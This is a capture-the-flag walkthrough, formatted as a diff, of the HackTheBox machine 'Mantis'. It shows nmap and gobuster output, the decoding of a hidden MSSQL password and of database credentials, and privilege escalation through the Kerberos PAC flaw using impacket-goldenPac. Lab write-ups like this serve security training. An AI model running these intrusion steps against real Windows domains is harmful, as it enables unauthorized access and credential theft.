@@ -1,0 +1,140 @@
+so we begin with an nmap scan and we see that:
+
+result=$(nmap -p- --min-rate=1000 -Pn  -T4 10.10.10.52   | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//' | tr -d '%');nmap -p$result -Pn -sC -sV 10.10.10.52  -oA mantis
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 16:52 EAT
+Nmap scan report for 10.10.10.52
+Host is up (0.27s latency).
+
+PORT      STATE SERVICE     VERSION
+53/tcp    open  domain      Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
+135/tcp   open  msrpc       Microsoft Windows RPC
+139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
+445/tcp   open  ���!+V      Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+1433/tcp  open  ms-sql-s    Microsoft SQL Server 2014 12.00.2000.00; RTM
+| ms-sql-info: 
+|   10.10.10.52:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2014 RTM
+|       number: 12.00.2000.00
+|       Product: Microsoft SQL Server 2014
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2023-07-29T13:54:26+00:00; +10s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2023-07-29T13:45:14
+|_Not valid after:  2053-07-29T13:45:14
+| ms-sql-ntlm-info: 
+|   10.10.10.52:1433: 
+|     Target_Name: HTB
+|     NetBIOS_Domain_Name: HTB
+|     NetBIOS_Computer_Name: MANTIS
+|     DNS_Domain_Name: htb.local
+|     DNS_Computer_Name: mantis.htb.local
+|     DNS_Tree_Name: htb.local
+|_    Product_Version: 6.1.7601
+3269/tcp  open  tcpwrapped
+8080/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Tossed Salad - Blog
+49155/tcp open  msrpc       Microsoft Windows RPC
+49162/tcp open  msrpc       Microsoft Windows RPC
+Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-07-29T13:54:10
+|_  start_date: 2023-07-29T13:45:07
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 48m11s, deviation: 1h47m22s, median: 9s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: mantis
+|   NetBIOS computer name: MANTIS\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: mantis.htb.local
+|_  System time: 2023-07-29T09:54:14-04:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 85.79 seconds
+
+so we begin by checking rpc(135) and we see that we can't login through that...
+and since this is  a windows server 2008 we can check for the PAC vulnerability that supposedly affects windows server 2003-2008  its good to have identified it from the banner obtained by smb
+
+but on to other things like smb we get nothing helpful so we decide to check out port 8080 and port 1433(Microsoft  SQL server 2014)
+
+on port 8080 we get:
+
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://mantis.htb.local:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/07/29 19:22:35 Starting gobuster in directory enumeration mode
+===============================================================
+/_archive             (Status: 200) [Size: 2867]
+/Admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2FAdmin]
+/admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2Fadmin]
+/ADMIN                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2FADMIN]
+/archive              (Status: 200) [Size: 2866]
+/Archive              (Status: 200) [Size: 2866]
+/blogs                (Status: 200) [Size: 2913]
+/tags                 (Status: 200) [Size: 2453]
+
+
+those are the bruteforced directories... 
+
+we don't get much even after checking on the web about the default creds of the orchard cms that is being used over there
+
+so we move back to 1337 which was detected... through bruteforcing it with gobuster we get the secure_notes directory...
+and on checking this directory we see there is dev notes which contains notes 
+
+1. Download OrchardCMS
+2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
+3. Launch IIS and add new website and point to Orchard CMS folder location.
+4. Launch browser and navigate to http://localhost:8080
+5. Set admin password and configure sQL server connection string.
+6. Add blog pages with admin user. 
+
+and also the name of the file is also sus... it looks like it has a base64 string decoding it we get a hexx string and decodung the hex string gets us the cred:
+
+m$$ql_S@_P@ssW0rd!
+
+echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d
+6d2424716c5f53405f504073735730726421
+
+ echo "6d2424716c5f53405f504073735730726421" | xxd -p -r                                                
+m$$ql_S@_P@ssW0rd!
+
+and thats how we got the pass... we can maybe use this creds to interact with the sql server
+
+using dbeaver I get creds belonging to the user james... 
+
+
+the creds are 
+username:james
+password:J@m3s_P@ssW0rd!
+
+now using these creds we exploit the PAC vuln 
+
+impacket-goldenPac htb.local/james@mantis.htb.local
+
+we login as system... thats all folks
